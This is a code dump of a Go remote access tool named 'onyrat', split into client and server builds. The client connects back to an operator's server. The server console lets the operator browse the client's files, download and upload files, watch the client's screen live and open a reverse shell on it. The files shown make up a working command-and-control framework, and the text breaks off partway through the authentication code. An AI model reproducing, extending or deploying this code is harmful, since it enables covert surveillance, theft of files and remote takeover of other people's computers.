@@ -1,0 +1,3553 @@
+main.go — cmd\client\main.go
+```
+//go:build client
+// +build client
+
+package main
+
+import (
+	"context"
+	"net"
+
+	"github.com/Onyz107/onyrat/internal/config"
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/auth"
+	"github.com/Onyz107/onyrat/pkg/commands"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/sirupsen/logrus"
+)
+
+func main() {
+	logger.Log.SetLevel(logrus.DebugLevel)
+
+	ctx, cancel := context.WithCancelCause(context.Background())
+	defer cancel(nil)
+
+	client, err := network.NewClient(net.JoinHostPort(config.ClientConfigs.Host, config.ClientConfigs.Port), ctx)
+	if err != nil {
+		cancel(err)
+		logger.Log.Error(err)
+		return
+	}
+	defer client.Disconnect()
+
+	logger.Log.Infof("Connected to server on: %s", net.JoinHostPort(config.ClientConfigs.Host, config.ClientConfigs.Port))
+
+	err = auth.ServerAuthorization(client, client.Manager, config.ClientConfigs.PublicKey)
+	if err != nil {
+		cancel(err)
+		logger.Log.Error(err)
+		return
+	}
+	logger.Log.Info("Authorization successful")
+
+	heartbeatManager := network.HeartbeatManager{
+		Communicator: client,
+		Manager:      client.Manager,
+		Ctx:          ctx,
+	}
+
+	heartbeatManager.Start()
+	defer heartbeatManager.Stop()
+	go func() {
+		if err := heartbeatManager.Wait(); err != nil {
+			cancel(err)
+			logger.Log.Error(err)
+		}
+	}()
+
+	commandHandler := commands.CommandHandler{
+		Communicator: client,
+		Ctx:          ctx,
+	}
+
+	commandHandler.StartClient()
+	defer commandHandler.StopClient()
+
+	if err := commandHandler.WaitClient(); err != nil {
+		cancel(err)
+		logger.Log.Error(err)
+	}
+}
+
+```
+
+main.go — cmd\server\main.go
+```
+//go:build server
+// +build server
+
+package main
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"net"
+
+	"github.com/Onyz107/onyrat/internal/banner"
+	"github.com/Onyz107/onyrat/internal/config"
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/auth"
+	"github.com/Onyz107/onyrat/pkg/commands"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/sirupsen/logrus"
+)
+
+type clientHandler struct {
+	Server *network.KCPServer
+	Ctx    context.Context
+	cancel context.CancelCauseFunc
+	done   chan error
+}
+
+func (ch *clientHandler) Run() {
+	inCtx, cancel := context.WithCancelCause(ch.Ctx)
+	ch.cancel = cancel
+	defer func() {
+		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
+			ch.done <- fmt.Errorf("failed to handle client: %w", err)
+		} else {
+			ch.done <- nil
+		}
+	}()
+	defer cancel(nil)
+
+	for {
+		select {
+
+		case <-inCtx.Done():
+			return
+
+		default:
+			c, err := ch.Server.AcceptClient()
+			if err != nil {
+				cancel(fmt.Errorf("failed to accept client: %w", err))
+				return
+			}
+			logger.Log.Infof("Client %s accepted.", c)
+
+			err = auth.ClientAuthorization(ch.Server, ch.Server.GetClient(c).Manager, config.ServerConfigs.PrivateKey)
+			if err != nil {
+				logger.Log.Errorf("failed to authorize client %s: %v", c, err)
+				continue
+			}
+
+			heartbeatManager := network.HeartbeatManager{
+				Communicator: ch.Server,
+				Manager:      ch.Server.GetClient(c).Manager,
+				Ctx:          ch.Server.GetClient(c).Ctx,
+			}
+
+			heartbeatManager.Start()
+			defer heartbeatManager.Stop()
+			go func() {
+				if err := heartbeatManager.Wait(); err != nil {
+					cancel(err)
+					return
+				}
+			}()
+		}
+	}
+
+}
+
+func (ch *clientHandler) Start() {
+	if ch.done == nil {
+		ch.done = make(chan error, 1)
+	}
+	go ch.Run()
+}
+
+func (ch *clientHandler) Wait() error {
+	if ch.done != nil {
+		err := <-ch.done
+		logger.Log.Debug("Received err")
+		return err
+	}
+	logger.Log.Debug("done is nil")
+	return fmt.Errorf("client handler not initialized")
+}
+
+func (ch *clientHandler) Stop() {
+	if ch.cancel != nil {
+		ch.cancel(fmt.Errorf("stopped by user"))
+	}
+	ch.cancel = nil // Make nil so we do not error if Stop is called again after being initilized for only once
+}
+
+func main() {
+	logger.Log.SetLevel(logrus.DebugLevel)
+
+	fmt.Println()
+	banner.PrintBanner()
+	fmt.Println()
+
+	ctx, cancel := context.WithCancelCause(context.Background())
+	defer cancel(nil)
+
+	server, err := network.NewServer(net.JoinHostPort(config.ServerConfigs.Host, config.ServerConfigs.Port), ctx)
+	if err != nil {
+		logger.Log.Error(err)
+		return
+	}
+	defer server.Close()
+
+	logger.Log.Infof("Server started listening on: %s", net.JoinHostPort(config.ServerConfigs.Host, config.ServerConfigs.Port))
+
+	clientHandler := clientHandler{
+		Server: server,
+		Ctx:    ctx,
+	}
+	clientHandler.Start()
+	defer clientHandler.Stop()
+	go func() {
+		if err := clientHandler.Wait(); err != nil {
+			cancel(err)
+			logger.Log.Error(err)
+		}
+	}()
+
+	commandHandler := commands.CommandHandler{
+		Communicator: server,
+		Ctx:          ctx,
+	}
+
+	commandHandler.StartServer()
+	defer commandHandler.StopServer()
+
+	if err := commandHandler.WaitServer(); err != nil {
+		cancel(err)
+		logger.Log.Error(err)
+	}
+}
+
+```
+
+common.go — internal\commands\client\common.go
+```
+//go:build client
+// +build client
+
+package handlers
+
+import "sync"
+
+// Small shared buffer pool
+var smallBufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 1024)
+	},
+}
+
+```
+
+download.go — internal\commands\client\download.go
+```
+//go:build client
+// +build client
+
+package handlers
+
+import (
+	"context"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/commands/transfer"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/xtaci/smux"
+)
+
+func HandleDownload(c *network.KCPClient, stream *smux.Stream, ctx context.Context) error {
+	buf := smallBufPool.Get().([]byte)
+	defer smallBufPool.Put(buf)
+
+	n, err := c.ReceiveEncrypted(stream, buf, 10*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to get the filename: %w", err)
+	}
+
+	filename := string(buf[:n])
+
+	go func() {
+		if err := transfer.Upload(c, c.Manager, filename, ctx); err != nil {
+			logger.Log.Errorf("failed to upload file: %s: %v", filename, err)
+		}
+	}()
+
+	return nil
+}
+
+```
+
+list.go — internal\commands\client\list.go
+```
+//go:build client
+// +build client
+
+package handlers
+
+import (
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/commands/files"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/xtaci/smux"
+)
+
+func HandleList(c *network.KCPClient, stream *smux.Stream) error {
+	buf := smallBufPool.Get().([]byte)
+	defer smallBufPool.Put(buf)
+
+	// Get path
+	n, err := c.ReceiveEncrypted(stream, buf, 10*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to receive folder path: %w", err)
+	}
+
+	if err := files.SendFiles(c, string(buf[:n])); err != nil {
+		return fmt.Errorf("failed to send listef file from path: %s: %w", string(buf[:n]), err)
+	}
+
+	return nil
+}
+
+```
+
+screenstream.go — internal\commands\client\screenstream.go
+```
+//go:build client
+// +build client
+
+package handlers
+
+import (
+	"context"
+	"fmt"
+
+	"github.com/Onyz107/onyrat/pkg/commands/videostreaming"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+func HandleScreenstream(c *network.KCPClient, ctx context.Context) error {
+	if err := videostreaming.ScreenstreamSend(c, ctx); err != nil {
+		return fmt.Errorf("failed to send screenstream: %w", err)
+	}
+
+	return nil
+}
+
+```
+
+shell.go — internal\commands\client\shell.go
+```
+//go:build client
+// +build client
+
+package handlers
+
+import (
+	"fmt"
+
+	"github.com/Onyz107/onyrat/pkg/commands/remoteshell"
+	"github.com/Onyz107/onyrat/pkg/network"
+)
+
+func HandleShell(c *network.KCPClient) error {
+	if err := remoteshell.SendShell(c); err != nil {
+		return fmt.Errorf("failed to establish shell connection: %w", err)
+	}
+
+	return nil
+}
+
+```
+
+upload.go — internal\commands\client\upload.go
+```
+//go:build client
+// +build client
+
+package handlers
+
+import (
+	"context"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/commands/transfer"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/xtaci/smux"
+)
+
+func HandleUpload(c *network.KCPClient, stream *smux.Stream, ctx context.Context) error {
+	buf := smallBufPool.Get().([]byte)
+	defer smallBufPool.Put(buf)
+
+	// Get output path
+	n, err := c.ReceiveEncrypted(stream, buf, 10*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to get output path: %w", err)
+	}
+
+	go func() {
+		if err := transfer.Download(c, c.Manager, string(buf[:n]), ctx); err != nil {
+			logger.Log.Errorf("failed to download file to: %s: %w", string(buf[:n]), err)
+		}
+	}()
+
+	return nil
+}
+
+```
+
+common.go — internal\commands\server\common.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"fmt"
+	"strconv"
+	"sync"
+
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/xtaci/smux"
+)
+
+// The stream for commands being handled by our program
+const commandStream = "commandStream"
+
+var (
+	streams = make(map[string]*smux.Stream)
+	mu      sync.Mutex
+)
+
+func getClient(s *network.KCPServer, addr string) (*network.KCPClient, error) {
+	var client *network.KCPClient
+
+	if id, err := strconv.Atoi(addr); err == nil {
+		for _, c := range s.GetClients() {
+			if c.ID == id {
+				client = c
+				addr = client.Sess.RemoteAddr().String()
+				break
+			}
+		}
+	} else {
+		// Treat as IP:Port string
+		client = s.GetClient(addr)
+	}
+	if client == nil {
+		return nil, fmt.Errorf("client not found")
+	}
+
+	return client, nil
+}
+
+func getStream(c *network.KCPClient) (*smux.Stream, error) {
+	mu.Lock()
+	defer mu.Unlock()
+	address := c.Sess.RemoteAddr().String()
+
+	stream, ok := streams[address]
+	if !ok {
+		var err error
+		stream, err = c.Manager.AcceptStream(commandStream, 0)
+		if err != nil {
+			return nil, fmt.Errorf("failed to accept stream: %w", err)
+		}
+		streams[address] = stream
+	}
+
+	return stream, nil
+}
+
+```
+
+disconnect.go — internal\commands\server\disconnect.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"fmt"
+
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterDisconnectCommand(s *network.KCPServer, shell *ishell.Shell) {
+	shell.AddCmd(&ishell.Cmd{
+		Name:    "disconnect",
+		Aliases: []string{"kill", "disconnect"},
+		Help:    "disconnect a client",
+		LongHelp: `
+Usage: disconnect <id|address>
+
+Gracefully disconnects the specified client by ID or address.
+
+Aliases: kill, disconnect`,
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) < 1 {
+				c.Println("Type `disconnect help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: disconnect <id|address>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			address = client.Sess.RemoteAddr().String()
+
+			s.DisconnectClient(address)
+		},
+	})
+}
+
+```
+
+download.go — internal\commands\server\download.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"context"
+	"fmt"
+	"os"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/commands/transfer"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterDownloadCommand(s *network.KCPServer, shell *ishell.Shell, ctx context.Context) {
+	shell.AddCmd(&ishell.Cmd{
+		Name: "download",
+		Help: "download a file from a client",
+		LongHelp: `
+Usage: download <id|address> <fileName> <targetPath>
+
+Downloads the specified file from a client to your machine.
+
+Examples:
+  download 1 secret.txt downloaded.txt
+  download 192.168.70.26 report.pdf report.pdf`,
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) < 3 {
+				c.Println("Type `download help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: download <id|address> <fileName> <targetPath>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			filename := c.Args[1]
+			if filename == "" {
+				c.Println("Usage: download <id|adderss> <fileName> <targetPath>")
+				c.Err(fmt.Errorf("invalid filename"))
+				return
+			}
+
+			targetPath := c.Args[2]
+			if targetPath == "" {
+				c.Println("Usage: download <id|adderss> <fileName> <targetPath>")
+				c.Err(fmt.Errorf("invalid target path"))
+				return
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			address = client.Sess.RemoteAddr().String()
+
+			stream, err := getStream(client)
+			if err != nil {
+				c.Println("Failed to get stream")
+				c.Err(err)
+				return
+			}
+
+			if _, err := os.Stat(targetPath); err == nil {
+				c.Printf("%s already exists\n", targetPath)
+				c.Err(fmt.Errorf("target path already exists"))
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
+				c.Println("Failed to send command to client")
+				c.Err(err)
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(filename), 10*time.Second); err != nil {
+				c.Println("Failed to send filename to client")
+				c.Err(err)
+				return
+			}
+
+			go func() {
+				if err := transfer.Download(s, client.Manager, targetPath, ctx); err != nil {
+					c.Printf("Failed to download file: %s: %v\n", filename, err)
+					return
+				}
+			}()
+		},
+	})
+}
+
+```
+
+list.go — internal\commands\server\list.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/commands/files"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterListFilesCommand(s *network.KCPServer, shell *ishell.Shell) {
+	shell.AddCmd(&ishell.Cmd{
+		Name: "ls",
+		Help: "list files in a directory on a client",
+		LongHelp: `
+Usage: ls <id|address> <path>
+
+Lists files in the specified directory on a client.
+
+Examples:
+  ls 1 /home/user/
+  ls 192.168.10.214:8000 .
+  ls 0`,
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) < 1 {
+				c.Println("Type `ls help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: ls <id|address> <path>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			path := ""
+			if len(c.Args) >= 2 {
+				path = c.Args[1]
+			}
+			if path == "" {
+				path = "."
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			address = client.Sess.RemoteAddr().String()
+
+			stream, err := getStream(client)
+			if err != nil {
+				c.Println("Failed to get stream")
+				c.Err(err)
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
+				c.Println("Failed to send command to client")
+				c.Err(err)
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(path), 10*time.Second); err != nil {
+				c.Println("Failed to send path to client")
+				c.Err(err)
+				return
+			}
+
+			files, err := files.ReceiveFiles(s, client)
+			if err != nil {
+				c.Printf("Failed to list files in path: %s: %v\n", path, err)
+				return
+			}
+			c.Println(files)
+		},
+	})
+}
+
+```
+
+screenstream.go — internal\commands\server\screenstream.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"context"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/commands/videostreaming"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterScreenStreamCommand(s *network.KCPServer, shell *ishell.Shell, ctx context.Context) {
+	shell.AddCmd(&ishell.Cmd{
+		Name:     "screenstream",
+		Help:     "view the remote client's screen in real-time",
+		LongHelp: "Usage: screenstream <id|address>\n\nEstablishes a real-time screen sharing session with the specified client.\nOpens a window displaying the client's screen, updating as new frames are received.\n\nExamples:\n  screenstream 1",
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) < 1 {
+				c.Println("Type `screenstream help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: screenstream <id|address>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			address = client.Sess.RemoteAddr().String()
+
+			stream, err := getStream(client)
+			if err != nil {
+				c.Println("Failed to get stream")
+				c.Err(err)
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
+				c.Println("Failed to send command to client")
+				c.Err(err)
+				return
+			}
+
+			inCtx, cancel := context.WithCancelCause(ctx)
+
+			shell.AddCmd(&ishell.Cmd{
+				Name: fmt.Sprintf("stop_screenstream_%s", address),
+				Help: fmt.Sprintf("stop the screenstreaming session between the server and %s", address),
+
+				Func: func(c *ishell.Context) {
+					cancel(nil)
+					shell.DeleteCmd(c.Cmd.Name)
+				},
+			})
+
+			go func() {
+				if err := videostreaming.ScreenstreamReceive(s, client, inCtx); err != nil {
+					c.Printf("Failed to start screen stream: %v\n", err)
+					return
+				}
+			}()
+		},
+	})
+}
+
+```
+
+shell.go — internal\commands\server\shell.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/commands/remoteshell"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterShellCommand(s *network.KCPServer, shell *ishell.Shell) {
+	shell.AddCmd(&ishell.Cmd{
+		Name: "shell",
+		Help: "start a reverse shell to a client",
+		LongHelp: `
+Usage shell <id|address>
+		
+Establishes a reverse shell connection to the client.
+Forwards STDOUT, STDERR, and STDIN between server and client.
+
+Examples:
+  shell 1
+  shell 192.168.70.23`,
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) == 0 {
+				c.Println("Type `shell help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: shell <id|address>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			address = client.Sess.RemoteAddr().String()
+
+			stream, err := getStream(client)
+			if err != nil {
+				c.Println("Failed to get stream")
+				c.Err(err)
+			}
+
+			c.Printf("Establishing shell connection to %s\n", address)
+			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
+				c.Println("Failed to send command to client")
+				c.Err(err)
+				return
+			}
+
+			if err := remoteshell.ReceiveShell(s, client); err != nil {
+				c.Println("Failed to start server shell listener")
+				c.Err(err)
+				return
+			}
+		},
+	})
+}
+
+```
+
+show.go — internal\commands\server\show.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterShowCommand(s *network.KCPServer, shell *ishell.Shell) {
+	showCmd := &ishell.Cmd{
+		Name:    "show",
+		Aliases: []string{"list"},
+		Help:    "display information about clients or data",
+		LongHelp: `
+Usage: show <thing> [...args]
+
+Examples:
+  show clients            # List all clients
+  show client 1           # Show details for client ID 1`,
+	}
+
+	shell.AddCmd(showCmd)
+
+	showCmd.AddCmd(&ishell.Cmd{
+		Name: "clients",
+		Help: "list all connected clients",
+		LongHelp: `
+Usage: show clients
+
+Displays a list of all currently connected clients with their ID, address, and connection time.`,
+
+		Func: func(c *ishell.Context) {
+			if len(s.GetClients()) == 0 {
+				c.Println("No clients")
+				return
+			}
+
+			for ip, client := range s.GetClients() {
+				// Show summary of clients
+				c.Println("---------------")
+				c.Printf("Client: %s\n", ip)
+				c.Printf("\tID: %d\n", client.ID)
+				c.Println("---------------")
+			}
+		},
+	})
+
+	showCmd.AddCmd(&ishell.Cmd{
+		Name: "client",
+		Help: "show detailed info for a specific client",
+		LongHelp: `
+Usage: show client <id|address>
+
+Shows detailed information for a specific client, including ID, authorization status, AES key, and last seen time.`,
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) < 1 {
+				c.Println("Type `show client help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: show client <id|address>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			c.Printf("Client: %s\n", address)
+			c.Printf("\tID: %d\n", client.ID)
+			c.Printf("\tAuthorized: %t\n", client.Authorized)
+
+			preview := client.AESKey
+			if len(client.AESKey) >= 4 {
+				preview = client.AESKey[:4]
+			}
+
+			c.Printf("\tAES Key: %x...\n", preview)
+			c.Printf("\tLast Seen: %ds ago\n", int(time.Since(client.LastSeen).Seconds()))
+		},
+	})
+}
+
+```
+
+upload.go — internal\commands\server\upload.go
+```
+//go:build server
+// +build server
+
+package handlers
+
+import (
+	"context"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/pkg/commands/transfer"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/abiosoft/ishell"
+)
+
+func RegisterUploadCommand(s *network.KCPServer, shell *ishell.Shell, ctx context.Context) {
+	shell.AddCmd(&ishell.Cmd{
+		Name: "upload",
+		Help: "upload a file to a client",
+		LongHelp: `
+Usage: upload <id|address> <fileName> <targetPath>
+
+Uploads the specified file from your machine to a client.
+
+Examples:
+  upload 1 secret.txt uploaded.txt
+  upload 192.168.70.26 report.pdf report.pdf`,
+
+		Func: func(c *ishell.Context) {
+			if len(c.Args) < 3 {
+				c.Println("Type `upload help` for more information")
+				c.HelpText()
+				c.Err(fmt.Errorf("not enough arguments"))
+				return
+			}
+
+			address := c.Args[0]
+			if address == "" {
+				c.Println("Usage: upload <id|address> <fileName> <targetPath>")
+				c.Err(fmt.Errorf("invalid address/id"))
+				return
+			}
+
+			filename := c.Args[1]
+			if filename == "" {
+				c.Println("Usage: upload <id|adderss> <fileName> <targetPath>")
+				c.Err(fmt.Errorf("invalid filename"))
+				return
+			}
+
+			targetPath := c.Args[2]
+			if targetPath == "" {
+				c.Println("Usage: upload <id|adderss> <fileName> <targetPath>")
+				c.Err(fmt.Errorf("invalid target path"))
+				return
+			}
+
+			client, err := getClient(s, address)
+			if err != nil {
+				c.Println("Failed to get client")
+				c.Err(err)
+				return
+			}
+
+			address = client.Sess.RemoteAddr().String()
+
+			stream, err := getStream(client)
+			if err != nil {
+				c.Println("Failed to get stream")
+				c.Err(err)
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
+				c.Println("Failed to send command to client")
+				c.Err(err)
+				return
+			}
+
+			if err := s.SendEncrypted(stream, []byte(targetPath), 10*time.Second); err != nil {
+				c.Println("Failed to send target path to client")
+				c.Err(err)
+				return
+			}
+
+			go func() {
+				if err := transfer.Upload(s, client.Manager, filename, ctx); err != nil {
+					c.Printf("Failed to download file: %s: %v\n", filename, err)
+					return
+				}
+			}()
+		},
+	})
+}
+
+```
+
+client.go — pkg\auth\client.go
+```
+//go:build client
+// +build client
+
+package auth
+
+import (
+	"crypto"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
+	"encoding/pem"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/xtaci/smux"
+)
+
+// Client-side server authorization
+func ServerAuthorization(c *network.KCPClient, manager *network.StreamManager, publicKey string) error {
+	block, _ := pem.Decode([]byte(publicKey))
+	if block == nil {
+		return fmt.Errorf("failed to parse public key")
+	}
+
+	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
+	if err != nil {
+		return fmt.Errorf("failed to parse public key: %w", err)
+	}
+
+	pub, ok := pubInterface.(*rsa.PublicKey)
+	if !ok {
+		return fmt.Errorf("public key is not RSA")
+	}
+
+	if err := authorizeServer(c, pub); err != nil {
+		c.Close()
+		return fmt.Errorf("failed to authorize server: %w", err)
+	}
+	logger.Log.Info("Server is successfully authorized.")
+
+	c.Authorized = true
+
+	return nil
+}
+
+// This function takes the client's randomly generated AES key, encrypts it and sends it to the server, then it sends
+// a challenge to the server and expects it to sign it, if the signature is incompatable with the configured public key
+// that means that the RSA key pair does not match between the client and the server therefore an error is returned.
+func authorizeServer(c *network.KCPClient, key *rsa.PublicKey) error {
+	stream, err := c.Manager.OpenStream(authStream, 30*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to open authorization stream: %w", err)
+	}
+	defer stream.Close()
+
+	challenge, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, key, c.AESKey, nil)
+	if err != nil {
+		return fmt.Errorf("failed to encrypt AES key: %w", err)
+	}
+
+	if err := c.SendSerialized(stream, challenge, 15*time.Second); err != nil {
+		return fmt.Errorf("failed to send AES key: %w", err)
+	}
+
+	if err := handleServerSignature(c, stream, key); err != nil {
+		return fmt.Errorf("failed to handle server's signature: %w", err)
+	}
+
+	return nil
+}
+
+func handleServerSignature(c *network.KCPClient, stream *smux.Stream, key *rsa.PublicKey) error {
+	challenge := make([]byte, 32)
+	rand.Read(challenge) // Docs say that the function never returns an error, so no need to check
+
+	if err := c.SendSerialized(stream, challenge, 15*time.Second); err != nil {
+		return fmt.Errorf("failed to send challenge: %w", err)
+	}
+
+	buf := bufPool.Get().([]byte)
+	defer bufPool.Put(buf)
+
+	n, err := c.ReceiveSerialized(stream, buf, 15*time.Second)
+	if err != nil {
+		return fmt.Errorf("failed to receive signature: %w", err)
+	}
+
+	signature := buf[:n]
+
+	hash := sha256.Sum256(challenge)
+	if err := rsa.VerifyPKCS1v15(key, crypto.SHA256, hash[:], signature); err != nil {
+		return fmt.Errorf("server identity check failed")
+	}
+
+	return nil
+}
+
+```
+
+constants.go — pkg\auth\constants.go
+```
+package auth
+
+import "sync"
+
+// Constant for the authorization stream name
+const authStream = "authorizationStream"
+
+var bufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 16*1024)
+	},
+}
+
+```
+
+server.go — pkg\auth\server.go
+```
+//go:build server
+// +build server
+
+package auth
+
+import (
+	"crypto"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
+	"encoding/pem"
+	"errors"
+	"fmt"
+	"time"
+
+	"github.com/Onyz107/onyrat/internal/logger"
+	"github.com/Onyz107/onyrat/pkg/network"
+	"github.com/xtaci/smux"
+)
+
+// Server-side client authorization
+func ClientAuthorization(s *network.KCPServer, manager *network.StreamManager, privateKey string) error {
+	blockPriv, _ := pem.Decode([]byte(privateKey))
+	if blockPriv == nil {
+		return fmt.Errorf("failed to parse private key")
+	}
+
+	priv, err := x509.ParsePKCS8PrivateKey(blockPriv.Bytes)
+	if err != nil {
+		return fmt.Errorf("failed to parse private key: %w", err)
+	}
+	key, ok := priv.(*rsa.PrivateKey)
+	if !ok {
+		return fmt.Errorf("private key is not RSA")
+	}
+
+	var errs []error
+	for addr, client := range s.GetClients() {
+		if client.Authorized {
+			continue
+		}
+
+		aesKey, err := authorizeClient(s, client, key)
+		if err != nil {
+			s.CloseClient(client.Sess.RemoteAddr().String())
+			errs = append(errs, fmt.Errorf("failed to authorize client: %w", err))
+			continue
+		}
+
+		client.Authorized = true
+		client.AESKey = aesKey
+		logger.Log.Infof("Client: %s is successfully authorized.", addr)
+	}
+
+	return errors.Join(errs...)
+}
+
+// This function receives an encrypted AES key from the client, decrypts it, receives a challenge from the client
+// signs the challenge and sends it back. If the server fails to decrypt the AES key that means that RSA key
+// pair between the server and the client do not match therefore an error is returned.
+func authorizeClient(s *network.KCPServer, c *network.KCPClient, key *rsa.PrivateKey) ([]byte, error) {
+	addr := c.Sess.RemoteAddr().String()
+
+	stream, err := c.Manager.AcceptStream(authStream, 30*time.Second)
+	if err != nil {
+		return nil, fmt.Errorf("failed to accept the authorization stream from client: %s: %w", addr, err)
+	}
+	defer stream.Close()
+
+	aesKey, err := handleClientAESKey(s, c, stream, key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to handle AES key from client: %s: %w", addr, err)
+	}
+
+	if err := handleSignature(s, c, stream, key); err != nil {
+		return nil, fmt.Errorf("failed to sign challenge from client: %s: %w", addr, err)
+	}
+
+	return aesKey, nil
+}
+
+func handleClientAESKey(s *network.KCPServer, c *network.KCPClient, stream *smux.Stream, key *rsa.PrivateKey) ([]byte, error) {
+	buf := bufPool.Get().([]byte)
+	defer bufPool.Put(buf)
+
+	addr := c.Sess.RemoteAddr().String()
+
+	n, err := s.ReceiveSerialized(stream, buf, 15*time.Second)
+	if err != nil {
+		return nil, fmt.Errorf("failed to recieve AES key from client: %s: %w", addr, err)
+	}
+	challenge := buf[:n]
+
+	plaintext, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, key, challenge, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decrypt AES key from client: %s: %w", addr, err)
+	}
+
+	return plaintext, nil
+}
+
+func handleSignature(s *network.KCPServer, c *network.KCPClient, stream *smux.Stream, key *rsa.PrivateKey) error {
